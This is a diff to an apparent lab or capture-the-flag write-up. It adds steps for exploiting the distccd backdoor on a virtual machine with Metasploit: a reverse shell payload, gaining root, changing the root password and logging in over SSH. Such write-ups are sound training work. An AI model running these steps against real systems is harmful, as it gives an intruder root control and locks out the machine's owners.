@@ -45,14 +45,31 @@ Now we need to find the vulnerabilities now that `msfconsole` is set up,
 This used `RHOSTS`, `RPORT`, and `PATH` - but I tried this and was unsuccessful in achieving the objective of the challenge.
 Instead, I will use the `distccd` Backdoor which uses two variables `LHOST`, and `RHOST` (Local Host/Remote Host)
 
-8. Ran the commands:
+5. Ran the commands:
 `set LHOST 10.0.2.5`
 `set RHOST 10.0.2.4`
 
-Now that we have set the variables, we need to choose a payload by using the command `show payloads`
+Now that we have set the variables, we need to choose a payload by using the command `show payloads` and I need to specifically look for a reverse SSH payload
 
+6. Ran the command `set PAYLOAD cmd/unix/reverse`
 
+Did this to set the payload as reverse SSH, time to exploit it using the command `exploit` 
 
+7. Ran the command `exploit`
+
+It looks like a success! Time to check if it worked running `whoami`
+
+8. Ran the command `whoami`
+
+Since we are root, we can change the password using the command `passwd root`
+
+9. Ran the command `passwd root`
+
+As I have now changed the password to root we can SSH into the machine like it is my own.
+
+10. Ran the command `ssh -oHostKeyAlgorithms=+ssh-dss root@10.0.2.4`
+
+Successful connection! I completed the challenge by changing the password to `root` and then SSHing into the machine.
 
 ## Steps
 1. Ran `ifconfig` and observed the `eth0` inet address, because this is on a Virtual Machine, it should only show `127.0.0.1` (itself) and the network IP.
@@ -64,6 +81,13 @@ Now that we have set the variables, we need to choose a payload by using the com
 7. Ran command `msfconsole`
 8. Ran command `set LHOST 10.0.2.5`
 9. Ran Command `set RHOST 10.0.2.4`
+10. Ran the command `set PAYLOAD cmd/unix/reverse`
+11. Ran the command `exploit`
+12. Ran the command `whoami`
+13. Ran the command `passwd root`
+14. Ran the command `ssh -oHostKeyAlgorithms=+ssh-dss root@10.0.2.4`
+
+
 
 
 
